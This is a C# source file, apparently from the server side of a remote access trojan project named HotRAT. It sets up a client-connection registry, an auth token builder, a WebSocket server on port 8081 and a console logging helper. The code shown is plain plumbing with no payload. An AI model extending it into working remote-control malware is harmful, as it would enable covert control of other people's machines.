using HotRAT.Server.Configs;
using HotRAT.Server.Models;
using HotRAT.WSServer.Models;
using System.Collections.Concurrent;
using System.Net;

namespace HotRAT.Server
{
    public class Runtimes
    {
        public static ConcurrentDictionary<Guid, ClientConnection> _clients = new();
        public static string Token() => Libs.Auth.TokenModel.Build(ConfigModels.serverConfig.Key);

        public static WebSocketServer WSserver = new WebSocketServer(IPAddress.Any, 8081);
        public static void CWrite(object msg, ConsoleColor color = ConsoleColor.White, bool IsWS = false)
        {
            if (IsWS)
                msg = $"[WS]{msg}";
            else
                msg = $"[TCP]{msg}";
            Console.ForegroundColor = color;
            Console.WriteLine($"{msg}");
            Console.ResetColor();
        }
    }
}
